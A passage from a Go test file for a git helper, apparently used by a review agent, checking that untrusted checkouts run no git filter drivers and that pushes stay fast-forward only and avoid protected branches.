		t.Fatalf("lines come from the committed content: %v", got)
	}

	// Control: a plain diff of the same range does run the driver, so the fixture is hostile.
	gitIn(t, r, "diff", base+"...HEAD")
	if _, err := os.Stat(filepath.Join(marks, "textconv")); err != nil {
		t.Fatalf("the fixture's textconv must run on a plain diff: %v", err)
	}
}

func TestUntrustedStatusShouldRunNoFilterOfTheCheckout(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	marks := hostileCheckout(t, r)
	wt := filepath.Join(t.TempDir(), "review")
	if err := g.AddUntrustedWorktree(ctx, r, wt, "pr"); err != nil {
		t.Fatal(err)
	}
	// A stale stat makes status re-hash the file, which runs its clean filter.
	stale := func() {
		t.Helper()
		later := time.Now().Add(time.Hour)
		if err := os.Chtimes(filepath.Join(wt, "a.txt"), later, later); err != nil {
			t.Fatal(err)
		}
	}

	stale()
	if out, err := g.UntrustedStatus(ctx, wt); err != nil || out != "" {
		t.Fatalf("an untouched checkout is clean: %q %v", out, err)
	}
	if ran, _ := os.ReadDir(marks); len(ran) != 0 {
		t.Fatalf("the status of third-party code ran %v", ran)
	}

	// Control: a plain status of the same stale checkout runs the clean filter.
	stale()
	if _, err := g.Status(ctx, wt); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(marks, "clean")); err != nil {
		t.Fatalf("the fixture's clean filter must run on a plain status: %v", err)
	}
}

// pushedBranch gives a repository an origin holding main and feat/x, checked out locally, and
// returns the repository and the head of feat/x on the origin.
func pushedBranch(t *testing.T) (r, head string) {
	t.Helper()
	r = repo(t)
	withOrigin(t, r)
	gitIn(t, r, "push", "-q", "origin", "main")
	gitIn(t, r, "switch", "-q", "-c", "feat/x")
	head = commitFile(t, r, "a.txt", "one\n")
	gitIn(t, r, "push", "-q", "origin", "feat/x")
	return r, head
}

func originHead(t *testing.T, r, branch string) string {
	t.Helper()
	out := gitIn(t, r, "ls-remote", "--heads", "origin", "refs/heads/"+branch)
	sha, _, _ := strings.Cut(out, "\t")
	return sha
}

func TestRemoteSHAShouldReturnTheBranchHeadOnOrigin(t *testing.T) {
	g, ctx := New(), context.Background()
	r, head := pushedBranch(t)
	commitFile(t, r, "b.txt", "local only\n") // the local branch moves, the origin does not
	got, err := g.RemoteSHA(ctx, r, "feat/x")
	if err != nil || got != head {
		t.Fatalf("RemoteSHA = %q %v, want the origin head %s", got, err, head)
	}
	if got, err := g.RemoteSHA(ctx, r, "feat/none"); err != nil || got != "" {
		t.Fatalf("a branch missing on origin has no SHA, got %q %v", got, err)
	}
}

func TestPushFastForwardShouldPushWhenRemoteIsUnchanged(t *testing.T) {
	g, ctx := New(), context.Background()
	r, expected := pushedBranch(t)
	fix := commitFile(t, r, "a.txt", "two\n")
	if err := g.PushFastForward(ctx, r, "feat/x", "origin/main", expected); err != nil {
		t.Fatal(err)
	}
	if got := originHead(t, r, "feat/x"); got != fix {
		t.Fatalf("origin must hold the fix %s, got %s", fix, got)
	}
}

func TestPushFastForwardShouldRefuseWhenRemoteMoved(t *testing.T) {
	g, ctx := New(), context.Background()
	r, expected := pushedBranch(t)
	// Someone else pushes to the branch while the agent works.
	other := filepath.Join(t.TempDir(), "other")
	gitIn(t, r, "worktree", "add", "-q", "--detach", other, expected)
	theirs := commitFile(t, other, "theirs.txt", "theirs\n")
	gitIn(t, other, "push", "-q", "origin", "HEAD:refs/heads/feat/x")
	commitFile(t, r, "a.txt", "two\n")
	err := g.PushFastForward(ctx, r, "feat/x", "origin/main", expected)
	if !errors.Is(err, ErrRemoteMoved) {
		t.Fatalf("a moved remote must be ErrRemoteMoved, got %v", err)
	}
	if got := originHead(t, r, "feat/x"); got != theirs {
		t.Fatalf("their push must survive, origin is at %s", got)
	}
}

func TestPushFastForwardShouldRefuseNonDescendantHead(t *testing.T) {
	g, ctx := New(), context.Background()
	r, expected := pushedBranch(t)
	// The agent rewrote the published commit instead of adding one on top of it.
	gitIn(t, r, "commit", "-q", "--amend", "-m", "rewritten")
	err := g.PushFastForward(ctx, r, "feat/x", "origin/main", expected)
	if err == nil || errors.Is(err, ErrRemoteMoved) {
		t.Fatalf("a head that does not descend from the remote must be refused, got %v", err)
	}
	if got := originHead(t, r, "feat/x"); got != expected {
		t.Fatalf("the published commit must stay on origin, got %s", got)
	}
}

func TestPushFastForwardShouldRefuseProtectedAndBaseBranches(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	withOrigin(t, r)
	gitIn(t, r, "push", "-q", "origin", "main")
	expected := gitIn(t, r, "rev-parse", "HEAD")
	commitFile(t, r, "a.txt", "on main\n")
	for _, b := range []string{"main", "master", "develop"} {
		if err := g.PushFastForward(ctx, r, b, "origin/develop", expected); err == nil {
			t.Errorf("push of %q must be refused", b)
		}
	}
	if got := originHead(t, r, "main"); got != expected {
		t.Fatalf("main must not move on origin, got %s", got)
	}
}

func TestAddWorktreeOnBranchShouldCheckOutTheRemoteHeadOfTheBranch(t *testing.T) {
	g, ctx := New(), context.Background()
	r, _ := pushedBranch(t)
	// The branch moves on origin after the local clone last saw it.
	other := filepath.Join(t.TempDir(), "other")
	gitIn(t, r, "worktree", "add", "-q", "--detach", other, "feat/x")
	remote := commitFile(t, other, "b.txt", "two\n")
	gitIn(t, other, "push", "-q", "origin", "HEAD:refs/heads/feat/x")
	gitIn(t, r, "worktree", "remove", "--force", other)
	gitIn(t, r, "switch", "-q", "main")
	wt := filepath.Join(t.TempDir(), "wts", "repo", "feat", "x")
	if err := g.AddWorktreeOnBranch(ctx, r, wt, "feat/x", "origin/main"); err != nil {
		t.Fatal(err)
	}
	if b, _ := g.CurrentBranch(ctx, wt); b != "feat/x" {
		t.Fatalf("worktree must be on the branch, got %q", b)
	}
	if head, _ := g.Head(ctx, wt); head != remote {
		t.Fatalf("worktree must start at the origin head %s, got %s", remote, head)
	}
}

func TestAddWorktreeOnBranchShouldRefuseBaseAndMain(t *testing.T) {
	g, ctx := New(), context.Background()
	r := repo(t)
	withOrigin(t, r)
	gitIn(t, r, "push", "-q", "origin", "main")
	for _, b := range []string{"main", "master", "develop"} {
		wt := filepath.Join(t.TempDir(), "wt")
		if err := g.AddWorktreeOnBranch(ctx, r, wt, b, "origin/develop"); err == nil {
			t.Errorf("a worktree on %q must be refused", b)
		}
		if _, err := os.Stat(wt); !os.IsNotExist(err) {
			t.Errorf("nothing is created when %q is refused", b)
		}
	}
}

func TestIsAncestorShouldTellWhetherHeadDescendsFromACommit(t *testing.T) {
	g, ctx := New(), context.Background()
	r, published := pushedBranch(t)
	commitFile(t, r, "a.txt", "two\n")
	if ok, err := g.IsAncestor(ctx, r, published, "HEAD"); err != nil || !ok {
		t.Fatalf("a commit on top of the published one descends from it: %v %v", ok, err)
	}
	gitIn(t, r, "reset", "-q", "--hard", "main")
	gitIn(t, r, "commit", "-q", "--allow-empty", "-m", "rewritten")
	if ok, err := g.IsAncestor(ctx, r, published, "HEAD"); err != nil || ok {
		t.Fatalf("a rewritten history does not descend from the published commit: %v %v", ok, err)
	}
	if _, err := g.IsAncestor(ctx, r, "0123456789abcdef0123456789abcdef01234567", "HEAD"); err == nil {
		t.Fatal("an unknown commit is an error, not a no")
	}
}

func TestCommitMessagesShouldReturnTheWholeMessageOfEachNewCommit(t *testing.T) {
	g, ctx := New(), context.Background()
	r, published := pushedBranch(t)
	gitIn(t, r, "commit", "-q", "--allow-empty", "-m", "fix: rename x (review)", "-m", "body line one\nbody line two")
	gitIn(t, r, "commit", "-q", "--allow-empty", "-m", "fix: second (review)")
	got, err := g.CommitMessages(ctx, r, published)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || !strings.Contains(got[0], "fix: rename x (review)") || !strings.Contains(got[0], "body line two") || !strings.Contains(got[1], "fix: second (review)") {
		t.Fatalf("each new commit's subject and body, oldest first: %q", got)
	}
	if strings.Contains(strings.Join(got, "\n"), "change a.txt") {
		t.Fatalf("commits up to the base are left out: %q", got)
	}
	if got, err := g.CommitMessages(ctx, r, "HEAD"); err != nil || len(got) != 0 {
		t.Fatalf("no new commit, no message: %q %v", got, err)
	}
}

func TestResetHardShouldMoveTheWorktreeBackToTheGivenCommit(t *testing.T) {
	g, ctx := New(), context.Background()
	dir := repo(t)
	a := commitFile(t, dir, "calc.go", "A")
	commitFile(t, dir, "calc.go", "B")
	if err := os.WriteFile(filepath.Join(dir, "calc.go"), []byte("uncommitted"), 0o600); err != nil {
		t.Fatal(err)
	}

	if err := g.ResetHard(ctx, dir, a); err != nil {
		t.Fatal(err)
	}
	if head, _ := g.Head(ctx, dir); head != a {
		t.Fatalf("HEAD = %s, want %s", head, a)
	}
	if body, _ := os.ReadFile(filepath.Join(dir, "calc.go")); string(body) != "A" {
		t.Fatalf("the file must hold commit A, got %q", body)
	}
	if st, _ := g.Status(ctx, dir); st != "" {
		t.Fatalf("the worktree must be clean after the reset, status=%q", st)
	}
}

func TestResetHardShouldFailForAnUnknownCommit(t *testing.T) {
	g, ctx := New(), context.Background()
	dir := repo(t)
	if err := g.ResetHard(ctx, dir, "0123456789abcdef0123456789abcdef01234567"); err == nil {
		t.Fatal("a commit that does not exist must fail the reset")
	}
}
